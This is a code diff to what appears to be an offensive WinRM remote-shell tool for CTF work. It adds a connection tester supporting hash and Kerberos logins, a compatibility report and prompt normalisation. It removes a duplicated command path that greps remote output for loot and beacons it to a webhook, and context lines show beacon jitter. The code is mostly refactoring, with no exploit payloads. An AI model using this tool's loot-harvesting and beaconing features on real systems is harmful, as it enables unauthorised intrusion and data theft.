@@ -22,6 +22,73 @@ module EvilCTF::Session
   # Alias for the uploader helper
   Uploader = EvilCTF::Uploader
 
+  def self.test_connection(endpoint:, user:, password:, hash: nil, ssl: false,
+                           kerberos: false, realm: nil, keytab: nil,
+                           debug: false, transport: nil, user_agent: nil,
+                           timeout: 10)
+    begin
+      conn = EvilCTF::Connection.build_full(
+        endpoint: endpoint,
+        user: user,
+        password: password,
+        hash: hash,
+        kerberos: kerberos,
+        realm: realm,
+        keytab: keytab,
+        ssl: ssl,
+        debug: debug,
+        transport: transport,
+        user_agent: user_agent
+      )
+      return { ok: false, error: "Could not create connection for #{endpoint}" } unless conn
+
+      validation = EvilCTF::ConnectionValidator.validate(conn, timeout: timeout)
+      return validation if validation[:ok]
+
+      report = nil
+      if validation[:error].to_s.match?(/wrong number of arguments|unknown keyword|no keywords accepted|given \d+, expected \d+/i)
+        report = ruby40_compatibility_report(
+          endpoint: endpoint,
+          operation: 'ConnectionValidator.validate',
+          detail: validation[:error]
+        )
+      end
+      validation.merge(report: report)
+    rescue ArgumentError => e
+      report = ruby40_compatibility_report(
+        endpoint: endpoint,
+        operation: 'Session.test_connection',
+        detail: e.message
+      )
+      { ok: false, error: e.message, report: report }
+    rescue => e
+      if defined?(WinRM::WinRMHTTPTransportError) && e.is_a?(WinRM::WinRMHTTPTransportError)
+        return {
+          ok: false,
+          error: "HTTP transport error: #{e.message}",
+          report: ruby40_compatibility_report(
+            endpoint: endpoint,
+            operation: 'WinRM HTTP transport',
+            detail: e.message
+          )
+        }
+      end
+
+      { ok: false, error: "#{e.class}: #{e.message}" }
+    end
+  end
+
+  def self.ruby40_compatibility_report(endpoint:, operation:, detail:)
+    <<~REPORT
+      Ruby 4.0 Compatibility Report
+      - Endpoint: #{endpoint}
+      - Operation: #{operation}
+      - Ruby: #{RUBY_VERSION}
+      - Detail: #{detail}
+      - Suggestion: verify all call sites use keyword arguments only and ensure winrm/winrm-fs are loaded from bundle exec context.
+    REPORT
+  end
+
   # ------------------------------------------------------------------
   # Main session loop & command handling
   # ------------------------------------------------------------------
@@ -172,7 +239,8 @@ module EvilCTF::Session
 
         begin
           Timeout.timeout(1800) do
-            prompt = shell.run('prompt').output
+            raw_prompt = shell.run('prompt').output
+            prompt = normalize_readline_prompt(raw_prompt)
             # Use a non-blocking approach for readline to allow interrupt detection
             input = nil
 
@@ -231,12 +299,12 @@ module EvilCTF::Session
 
             # Command dispatch via dispatcher
             dispatch_result = EvilCTF::CommandDispatcher.dispatch(
-              input, 
-              input.split(/\s+/, 2)[1] || '',
-              shell,
-              session_options,
-              command_manager,
-              history
+              name: input,
+              args: input.split(/\s+/, 2)[1] || '',
+              shell: shell,
+              session_options: session_options,
+              command_manager: command_manager,
+              history: history
             )
 
             if dispatch_result[:handled]
@@ -281,40 +349,6 @@ module EvilCTF::Session
                                  '$PID', result.exitcode || 0)
               sleep(rand(30..90)) if session_options[:beacon]
             end
-
-              # Macro expansion
-
-            if command_manager.expand_macro(input, shell,
-                                            webhook: session_options[:webhook])
-              last_command_was_tool_upload = false
-              next
-            end
-
-            # Normal command path
-            cmd = command_manager.expand_alias(input)
-            start = Time.now
-            result = shell.run(cmd)
-            elapsed = Time.now - start
-            puts result.output
-            # --- Session Logging: Log output ---
-            if session_logfile
-              File.open(session_logfile, 'a') do |f|
-                f.puts "[#{Time.now.strftime('%Y-%m-%d %H:%M:%S')}] OUT:"
-                f.puts result.output
-              end
-            end
-            unless last_command_was_tool_upload
-              matches = EvilCTF::Tools.grep_output(result.output)
-              if matches.any?
-                EvilCTF::Tools.save_loot(matches)
-                EvilCTF::Tools.beacon_loot(session_options[:webhook], matches) if session_options[:webhook]
-              end
-            end
-            last_command_was_tool_upload = false
-
-            logger.log_command(cmd, result, elapsed,
-                               '$PID', result.exitcode || 0)
-            sleep(rand(30..90)) if session_options[:beacon]
           end
         rescue Timeout::Error
           puts "\n[!] Idle timeout — closing session"
@@ -432,6 +466,19 @@ module EvilCTF::Session
   def self.setup_autocomplete(history)
     Readline.completion_append_character = " "
     Readline.completion_proc = proc { |s| history.history.grep(/^#{Regexp.escape(s)}/) }
+  end
+
+  # Normalize remote prompt output so Readline renders correctly.
+  # - Converts literal "\\n" sequences into real newlines.
+  # - Collapses CRLF/CR variations to LF.
+  # - Trims trailing newlines and ensures a trailing space for cursor alignment.
+  def self.normalize_readline_prompt(raw_prompt)
+    prompt = raw_prompt.to_s
+    prompt = prompt.gsub('\\r\\n', "\n").gsub('\\n', "\n")
+    prompt = prompt.gsub("\r\n", "\n").gsub("\r", "\n")
+    prompt = prompt.rstrip
+    prompt = '> ' if prompt.empty?
+    prompt.end_with?(' ') ? prompt : "#{prompt} "
   end
 
   def self.parse_hosts_file(hosts_file)
